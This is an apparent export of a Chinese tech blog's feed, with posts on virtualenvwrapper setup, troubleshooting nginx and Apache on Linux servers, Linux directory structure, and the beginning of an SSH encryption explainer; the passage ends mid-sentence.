.</p></blockquote><h2 id="安装virtualenvwrapper"><a href="#安装virtualenvwrapper" class="headerlink" title="安装virtualenvwrapper"></a>安装virtualenvwrapper</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenvwrapper</span><br></pre></td></tr></table></figure><h2 id="配置workhome"><a href="#配置workhome" class="headerlink" title="配置workhome"></a>配置workhome</h2><p>把下面几行加入~/.bashrc </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python2<span class="number">.7</span> <span class="comment"># 这句是为了防止环境变量$PATH中已有其它环境的python</span></span><br><span class="line">export WORKON_HOME=$HOME/.virtualenvs    <span class="comment"># 放所有虚拟环境的地方</span></span><br><span class="line">source /usr/local/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><p>在终端输入<code>source ~/.bashrc</code> </p><h2 id="新建Virtualenv"><a href="#新建Virtualenv" class="headerlink" title="新建Virtualenv"></a>新建Virtualenv</h2><p>新建虚拟环境的指令由原来的<code>virtualenv vpath</code>更换为<code>mkvirtualenv vname</code>，默认把路径放到了<code>$WORKON_HOME</code>下，并且原来的<code>--system-site-packages</code>和<code>--no-site-packages</code>等选项都还是可以用的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv VirtalenvName1</span><br></pre></td></tr></table></figure><p>建好之后默认就已经进入这个虚拟环境了（命令行前会有一个括号+环境名的提示），退出是<code>deactivate</code></p><h2 id="Virtualenvwrapper常用指令"><a href="#Virtualenvwrapper常用指令" class="headerlink" title="Virtualenvwrapper常用指令"></a>Virtualenvwrapper常用指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv 创建环境</span><br><span class="line">workon 切换到环境</span><br><span class="line">deactivate 注销当前环境</span><br><span class="line">lsvirtualenv 列出所有环境</span><br><span class="line">rmvirtualenv 删除环境</span><br><span class="line">cpvirtualenv 复制环境</span><br><span class="line">cdsitepackages cd到当前环境的site-packages目录</span><br><span class="line">lssitepackages 列出当前环境中site-packages内容</span><br><span class="line">setvirtualenvproject 绑定现存的项目和环境</span><br><span class="line">wipeenv 清除环境内所有第三方包</span><br></pre></td></tr></table></figure><h1 id="指定python版本的安装"><a href="#指定python版本的安装" class="headerlink" title="指定python版本的安装"></a><center>指定python版本的安装</center></h1><blockquote><p>默认安装的是系统自带的版本2.7，但是我们想要安装版本3.做法如下</p></blockquote><h2 id="更新源信息并安装"><a href="#更新源信息并安装" class="headerlink" title="更新源信息并安装"></a>更新源信息并安装</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> update</span><br><span class="line">apt-<span class="built_in">get</span> install python3<span class="number">.4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="指定版本创建虚拟环境"><a href="#指定版本创建虚拟环境" class="headerlink" title="指定版本创建虚拟环境"></a>指定版本创建虚拟环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv -p python路径 虚拟环境名称  </span><br></pre></td></tr></table></figure><p>上面的命令执行时，系统会创建默认的python版本的开发环境，一般大家的电脑会同时安装python2和python3版本，有时需要不同的版本创建虚拟环境。 </p><p>例如：    <code>mkvirtualenv -p /usr/bin/python3 mywork</code></p><p>-p 指的是path的简写Py安装的路径，默认安装在/usr/bin/目录下； </p><p>如果一时间找不到，使用命令： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> whereis python3  </span><br></pre></td></tr></table></figure><p>在终端命令行搜索，会出现想要的路径。 </p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 虚拟环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云ECS服务器无法通过公网ip地址访问</title>
      <link href="/2018/05/14/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91ip%E5%9C%B0%E5%9D%80%E8%AE%BF%E9%97%AE/"/>
      <url>/2018/05/14/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91ip%E5%9C%B0%E5%9D%80%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<p>这几天折腾一下刚买的阿里云ECS服务器，系统是Ubuntu14.04，安装并配置好 nginx之后，在浏览器中通过ip地址不能访问，一直在苦寻解决方法。</p><a id="more"></a><h1 id="猜测一：nginx没有启动"><a href="#猜测一：nginx没有启动" class="headerlink" title="猜测一：nginx没有启动"></a>猜测一：nginx没有启动</h1><li>确认nginx是否配置ok？</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -L</span><br><span class="line">输出结果表明没有问题</span><br></pre></td></tr></table></figure><li>看看能不能ping通？</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping  公网ip地址</span><br></pre></td></tr></table></figure><p>结果显示可以ping通</p><li>在服务器中查看nginx状态。</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service nginx staus  # 显示服务启动了</span><br><span class="line">service nginx restart # 梦想能够重启nginx恢复好，结果还是天真了</span><br></pre></td></tr></table></figure><h1 id="猜测二：apache占用了80端口"><a href="#猜测二：apache占用了80端口" class="headerlink" title="猜测二：apache占用了80端口"></a>猜测二：apache占用了80端口</h1><li>查看Apache状态并关闭</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep httpd</span><br><span class="line">servcie httpd status</span><br><span class="line">service httpd stop</span><br></pre></td></tr></table></figure><p>但是问题仍然没有解决</p><h1 id="猜测三：防火墙没有关闭"><a href="#猜测三：防火墙没有关闭" class="headerlink" title="猜测三：防火墙没有关闭"></a>猜测三：防火墙没有关闭</h1><li>查看防火墙的状态</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw status</span><br><span class="line">或者</span><br><span class="line">service ufw status</span><br></pre></td></tr></table></figure><p>结果显示防火墙正在运行，欣喜若狂，以为找到了原因。</p><li>关闭防火墙</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ufw stop</span><br></pre></td></tr></table></figure><li>重新启动nginx</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><p>浏览器访问还是不行。</p><li>查看80端口状态如何</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nlp | grep 80</span><br></pre></td></tr></table></figure><p>显示nginx正在监听。</p><blockquote><p>这个时候就非常的纳闷了</p></blockquote><h1 id="最终问题的原因"><a href="#最终问题的原因" class="headerlink" title="最终问题的原因"></a>最终问题的原因</h1><p>最终不断的上网查资料，找到了原因。</p><blockquote><p>看了防火墙及安全规则，经搜索和研究，原来是安全规则没有设置 80 端口，和 443端口，导致的无法访问。 </p></blockquote><p>于是就添加上80端口就行了</p><p>如图操作就行了</p><p><img src="/2018/05/14/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91ip%E5%9C%B0%E5%9D%80%E8%AE%BF%E9%97%AE/2.png"></p><p><img src="/2018/05/14/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91ip%E5%9C%B0%E5%9D%80%E8%AE%BF%E9%97%AE/1.png"></p><p>最终访问ip成功。</p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx启动失败</title>
      <link href="/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/"/>
      <url>/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<p><strong>个人总结一下自己在启动nginx时候出现启动失败的原因</strong></p><a id="more"></a><p>下面是我个人遇到启动失败解决的方法：</p><blockquote><p><strong>1：</strong>开始是因为 apache占用了端口，无法启动nginx ，但是关闭apache关闭后任然无法启动nginx（继续思考）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep httpd  #显示active</span><br><span class="line">service httpd stop   </span><br><span class="line">sudo service nginx start  # 仍然失败</span><br></pre></td></tr></table></figure><p><strong>2：</strong>以为是防火墙的原因，关闭后任然无法解决（现实中这个常常是问题的原因）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service firewalld status  # 显示active</span><br><span class="line">servcie firewalld stop</span><br><span class="line">sudo service nginx start  # 仍然失败</span><br></pre></td></tr></table></figure><p><strong>3：</strong>考虑到<code>配置文件</code>的问题，nginx 默认的配置文件，没有动过，但是我新增加了wlk和laravel配置文件，也许是这个问题，把这两个文件删除了，重新启动nginx，果然成功了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;nginx</span><br><span class="line">cd conf.d&#x2F;</span><br><span class="line">rm wlk.conf</span><br><span class="line">rm laravel.conf</span><br><span class="line">service nginx start</span><br><span class="line">ps -ef | grep nginx # 显示active</span><br></pre></td></tr></table></figure></blockquote><p><strong>再次访问：</strong>成功</p><p><img src="/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/%E5%9B%BE%E7%89%871.png"></p><blockquote><p>记得在windows下的hosts文件中添加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.115  laravel.imooc.test</span><br></pre></td></tr></table></figure></blockquote><p><strong>重新解决一下为什么我自己写的配置文件导致启动失败，想想一下是不是配置文件内容有问题</strong></p><p><img src="/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/%E5%9B%BE%E7%89%872.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service nginx start</span><br></pre></td></tr></table></figure><p>这个时候启动nginx失败了。</p><blockquote><p>此刻我们需要查看日志文件帮助我们解决问题</p></blockquote><p><img src="/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/%E5%9B%BE%E7%89%873.png"></p><p>图中的红色解释了原因，果然是配置文件出了问题。</p><blockquote><p>我们查看有哪些日志文件</p></blockquote><p><img src="/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/%E5%9B%BE%E7%89%874.png"></p><blockquote><p>现在我们根据日志文件的说明进行修改,并重新启动</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim nginx.conf</span><br><span class="line">sudo servcie nginx start</span><br></pre></td></tr></table></figure><p><img src="/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/%E5%9B%BE%E7%89%875.png"></p><p><img src="/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/%E5%9B%BE%E7%89%876.png"></p><blockquote><p>此时问题解决，也多了一个access_laravel.log在nginx下。</p></blockquote><p><img src="/2018/05/14/nginx%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/%E5%9B%BE%E7%89%878.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache基础了解</title>
      <link href="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/"/>
      <url>/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache基本操作"><a href="#Apache基本操作" class="headerlink" title="Apache基本操作"></a><center>Apache基本操作</center></h1><a id="more"></a><table><thead><tr><th align="center">安装</th><th align="center">yum install httpd</th></tr></thead><tbody><tr><td align="center">启动</td><td align="center">service httpd start</td></tr><tr><td align="center">停止</td><td align="center">service httpd stop</td></tr><tr><td align="center">查看状态</td><td align="center">sudo netstat -anpl | grep ‘http’</td></tr></tbody></table><p>具体如图所示</p><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8741.png"></p><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8742.png"></p><p>此时我们在浏览器中去访问看一下</p><p>输入虚拟机的ip地址（默认端口号为80，当然你也可以加上端口号）</p><p>我们发现访问失败了</p><blockquote><p>解决办法：将防火墙关闭了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service firewalld stop</span><br></pre></td></tr></table></figure></blockquote><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8743.png"></p><h1 id="虚拟主机配置"><a href="#虚拟主机配置" class="headerlink" title="虚拟主机配置"></a><center>虚拟主机配置</center></h1><p>首先有个了解 ,进入配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8744.png"></p><li>配置一下虚拟主机</li>注意几个关键词<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ServerName</span><br><span class="line">DocumentRoot</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8745.png"></p><li>重启服务器</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service httpd restart</span><br></pre></td></tr></table></figure><li>建立DocumentRoot目录</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p &#x2F;data&#x2F;www  # -p 表示循环建立目录</span><br></pre></td></tr></table></figure><li>写一个首页面index.html</li><p>准备在/data/www写一个页面，发现无法写入</p><blockquote><p><strong>原因</strong>：www是属于root账户下，普通用户无法再改目录下写index.html</p><p>办法：改变权限</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R wlk:wlk &#x2F;data</span><br></pre></td></tr></table></figure><p>此时www属于wlk用户的，就可以编写一个index.html页面了</p><li>访问页面</li><p>此时去访问我们刚刚写入的虚拟域名（<a href="http://www.imooc.test)是无法访问的,因为你没有绑定域名,站点无法访问./">www.imooc.test）是无法访问的，因为你没有绑定域名，站点无法访问。</a></p><blockquote><p>办法：在windows下找到<code>hosts</code>文件将 192.168.1.115 <a href="http://www.imooc.test/">www.imooc.test</a> 这样即使是虚拟的我们任然可以测试访问</p></blockquote><p>这时候我们<code>ping</code>这个虚拟域名，看是否成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.imooc.test</span><br></pre></td></tr></table></figure><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8746.png"></p><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8747.png"></p><blockquote><p><strong>问题：</strong>发现首页面并不是我们写好的页面</p><p><strong>解决办法：</strong>查看日志log</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;httpd&#x2F;logs</span><br><span class="line">发现权限不够</span><br><span class="line">方法：sudo su - 或者 sudo su -root</span><br><span class="line">ll</span><br><span class="line">输出有两个日志：&#96;access_log&#96;和&#96;error_log&#96;</span><br><span class="line">tail -f access_log   # 访问日志</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>查看错误日志，解决问题</p></blockquote><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8748.png"></p><blockquote><p>问题解决：</p></blockquote><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8749.png"></p><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8750.png"></p><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8751.png"></p><blockquote><p><strong>插播：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setenfore</span><br></pre></td></tr></table></figure><p>0:  宽松模式</p><p>1:  强迫模式</p><li>如何修改</li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;selinux&#x2F;config</span><br></pre></td></tr></table></figure></blockquote><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8752.png"></p><p><img src="/2018/05/13/Apache%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3/%E5%9B%BE%E7%89%8753.png"></p><h1 id="伪静态操作"><a href="#伪静态操作" class="headerlink" title="伪静态操作"></a><center>伪静态操作<center></center></center></h1>]]></content>
      
      
      <categories>
          
          <category> Apache </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux各目录了解知多少</title>
      <link href="/2018/05/13/Linux%E5%90%84%E7%9B%AE%E5%BD%95%E4%BA%86%E8%A7%A3%E7%9F%A5%E5%A4%9A%E5%B0%91/"/>
      <url>/2018/05/13/Linux%E5%90%84%E7%9B%AE%E5%BD%95%E4%BA%86%E8%A7%A3%E7%9F%A5%E5%A4%9A%E5%B0%91/</url>
      
        <content type="html"><![CDATA[<h1 id="常见目录说明"><a href="#常见目录说明" class="headerlink" title="常见目录说明"></a><center>常见目录说明</center></h1><a id="more"></a><table><thead><tr><th>目录</th><th align="center">解释</th></tr></thead><tbody><tr><td>/bin</td><td align="center">存放二进制可执行文件(<code>ls,cat,mkdir</code>等)，常用命令一般都在这里。</td></tr><tr><td>/etc</td><td align="center">存放系统管理和配置文件</td></tr><tr><td>/home</td><td align="center">存放所有用户文件的根目录，是用户主目录的基点，比如用户user 的主目录就是<code>/home/user</code>，可以用<code>~user</code>表示</td></tr><tr><td>/usr</td><td align="center">用于存放系统应用程序，比较重要的目录<code>/usr/local</code> 本地系统管理员软件安装目录（安装系统级的应用）。这是最庞大的目录，要用到的应用程序和文件几乎都在这个目录。    /usr/bin:众多的应用程序                                                             /usr/sbin:超级用户的一些管理程序                                         /usr/man:帮助文档                                                                    /usr/src:源代码，linux内核的源代码就放在/usr/src/linux里  /usr/include ：linux下开发和编译应用程序所需要的头文件  / usr/local/bin: 本地增加的命令                                                   /usr/local/lib: 本地增加的库</td></tr><tr><td>/opt</td><td align="center">额外安装的可选应用程序包所放置的位置。一般情况下，我们可以把tomcat等都安装到这里。</td></tr><tr><td>/proc</td><td align="center">虚拟文件系统目录，是系统内存的映射。可直接访问这个目录来获取系统信息。</td></tr><tr><td>/sbin</td><td align="center">存放二进制可执行文件，只有<code>root</code>才能访问。这里存放的是系统管理员使用的系统级别的管理命令和程序。如ifconfig等</td></tr><tr><td>/dev</td><td align="center">用于存放设备文件。</td></tr><tr><td>/mnt</td><td align="center">系统管理员安装临时文件系统的安装点，系统提供这个目录是让用户临时挂载其他的文件系统。</td></tr></tbody></table><table><thead><tr><th align="center">/lib</th><th align="center">存放跟文件系统中的程序运行所需要的共享库及内核模块。共享库又叫动态链接共享库，作用类似windows里的.dll文件，存放了根文件系统程序运行所需的共享文件。</th></tr></thead><tbody><tr><td align="center">/tmp</td><td align="center">用于存放各种临时文件，是公用的临时文件存储点。</td></tr><tr><td align="center">/lost+found</td><td align="center">这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows下叫什么.chk）就在这里</td></tr><tr><td align="center">/var</td><td align="center">用于存放运行时需要改变数据的文件，也是某些大文件的溢出区，比方说各种服务的日志文件（系统启动日志等。）等。</td></tr><tr><td align="center"></td><td align="center"></td></tr></tbody></table><h1 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a><center>详细说明</center></h1><h2 id="etc文件系统"><a href="#etc文件系统" class="headerlink" title="/etc文件系统"></a>/etc文件系统</h2><p>/etc 目录包含各种系统配置文件，下面说明其中的一些。其他的你应该知道它们属于哪个程序，并阅读该程序的m a n页。许多网络配置文件也在/etc 中。 </p><p>1. <code>/etc/rc</code>或<code>/etc/rc.d</code>或<code>/etc/rc?.d </code> 启动、或改变运行级时运行的脚本或脚本的目录。<br>2. <code>/etc/passwd</code>  用户数据库，其中的域给出了用户名、真实姓名、用户起始目录、加密口令和用户的其  他信息。<br>3. <code>/etc/fdprm</code>  软盘参数表，用以说明不同的软盘格式。可用<code>setfdprm </code>进行设置。更多的信息见s e t f d p r m  的帮助页。<br>4. <code>/etc/fstab </code> 指定启动时需要自动安装的文件系统列表。也包括用<code>swapon -a</code>启用的s w a p区的信息。<br>5. <code>/etc/group  </code>类似/etc/passwd ，但说明的不是用户信息而是组的信息。包括组的各种数据。<br>6. <code>/etc/inittab</code>:  init 的配置文件。<br>7. <code>/etc/issue</code>  包括用户在登录提示符前的输出信息。通常包括系统的一段短说明或欢迎信息。具体内容由系统管理员确定。<br>8. <code>/etc/magic</code> : “f i l e”的配置文件。包含不同文件格式的说明，“f i l e”基于它猜测文件类型。<br>9. <code>/etc/motd</code>:  m o t d是message of the day的缩写，用户成功登录后自动输出。内容由系统管理员确定。常用于通告信息，如计划关机时间的警告等。<br>10. <code>/etc/mtab </code>: 当前安装的文件系统列表。由脚本( s c r i t p )初始化，并由<code>mount</code> 命令自动更新。当需要一个当前安装的文件系统的列表时使用(例如df 命令)。<br>11. <code>/etc/shadow</code> : 在安装了影子( s h a d o w )口令软件的系统上的影子口令文件。影子口令文件将/ e t c / p a s s wd文件中的加密口令移动到/ e t c / s h a d o w中，而后者只对超级用户( r o o t)可读。这使破译口令更困难，以此增加系统的安全性。<br>12. <code>/etc/login.defs</code>：  l o g i n命令的配置文件。<br>13. <code>/etc/printcap</code>  :类似/etc/termcap ，但针对打印机。语法不同。<br>14. <code>/etc/profile </code>、<code>/ e t c / c s h . l o g i n</code>、<code>/etc/csh.cshrc  </code>登录或启动时b o u r n e或c shells执行的文件。这允许系统管理员为所有用户建立全局缺省环境。<br>15. <code>/etc/securetty </code> :确认安全终端，即哪个终端允许超级用户( r o o t )登录。一般只列出虚拟控制台，这样就不可能(至少很困难)通过调制解调器( m o d e m )或网络闯入系统并得到超级用户特权。<br>16. <code>/etc/shells </code> :列出可以使用的s h e l l。chsh 命令允许用户在本文件指定范围内改变登录的s h e l l。提供一台机器f t p服务的服务进程ftpd 检查用户s h e l l是否列在/etc/shells 文件中，如果不是，将不允许该用户登录。<br>17. <code>/etc/termcap</code> : 终端性能数据库。说明不同的终端用什么“转义序列”控制。写程序时不直接输出转义序列(这样只能工作于特定品牌的终端)，而是从/etc/termcap 中查找要做的工作的正确序列。  这样，多数的程序可以在多数终端上运行。 </p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux目录结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH学习</title>
      <link href="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>SSH 服务在进行数据传输前，会先进行<code>密钥</code><strong>交换和协商</strong>确认。完成后再对后续数据进行加密传输，以提高安全性。本文先对 SSH 服务所采用的<code>非对称加密</code>技术进行简要介绍，然后对 SSH 连接过程中的相关交互，及关联文件进行说明。 </p><a id="more"></a><h1 id="非对称加密技术"><a href="#非对称加密技术" class="headerlink" title="非对称加密技术"></a><center>非对称加密技术</center></h1><p>SSH 服务基于<strong>非对称加密</strong>（<strong>public-key cryptography</strong>，也称<strong>公开密钥加密</strong>）技术实现数据加密传输。该技术会生成一对数学相关的密钥，其中一个用于对数据进行加密，而且只能用于加密，而另一个只能用于解密。使用加密密钥加密后的数据，只能用对应的解密密钥才能解密。而且，只知道其中一个密钥，无法计算出另一个。因此，如果公开了一对密钥中的一个，并不会危害到另一个的秘密性质。通常把公开的密钥称为<strong>公钥</strong>（public key），而不公开的密钥称为<strong>私钥</strong>（private key）。</p><p>如果公开的是解密密钥，该场景用于客户端验证持有私钥一方发布的数据或文件的完整性、准确性，以防止数据篡改。相应的密钥称为<strong>数字签名（数字证书）</strong>。如果公开的是加密密钥，该场景用于客户给私钥所有者上传数据，称为<strong>公开密钥加密。</strong> SSH 服务基于该场景实现。</p><p>与<strong>对称密钥加密</strong>相比，非对称加密的优点在于不存在共享的通用密钥。由于解密用的私钥无需发送给任何用户，所以可以避免密钥被劫持或篡改。而加密用的公钥即便被劫持或篡改，如果没有与其匹配的私钥，也无法解密数据。所以，截获的公钥是没有任何用处的。</p><p>当前，SSH主要采用 <code>RSA 算法（协议 V2 默认算法）和 </code>DSA 算法（协议 V1 仅支持该算法）来实现非对称加密技术。</p><h1 id="连接交互过程"><a href="#连接交互过程" class="headerlink" title="连接交互过程"></a><center>连接交互过程</center></h1><p>SSH 服务建立连接时的相关交互过程，如下 图所示</p><p><img src="/2018/05/13/SSH%E5%AD%A6%E4%B9%A0/1.png"></p><p>连接过程中的相关交互步骤，详细说明如下。 </p><blockquote><p>1.服务端准备阶段</p><p>2.非对称加密协商</p><p>3.后续数据交互过程</p></blockquote><br><h2 id="服务端准备阶段"><a href="#服务端准备阶段" class="headerlink" title="服务端准备阶段"></a>服务端准备阶段</h2><p>服务端在每次启动 SSH 服务时，都会自动检查<code>/etc/ssh/</code>目录下相关密钥文件的有效性。如果相关文件检查发现异常，则会导致服务启动失败，并抛出相应错误信息。 如果文件相关不存在，则会自动重新创建。</p><p>默认创建的相关文件及用途说明如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ll &#x2F;etc&#x2F;ssh&#x2F;</span><br><span class="line">-rw-------. 1 root root 125811 Aug 13  2015 moduli            → 用于 DH-GEX 算法</span><br><span class="line">-rw-r--r--. 1 root root   2047 Aug 13  2015 ssh_config            → SSH 客户端配置文件</span><br><span class="line">-rw-------. 1 root root   3879 Aug 13  2015 sshd_config            → SSH 服务配置文件</span><br><span class="line">-rw-------. 1 root root    672 May 20 14:22 ssh_host_dsa_key        → DSA 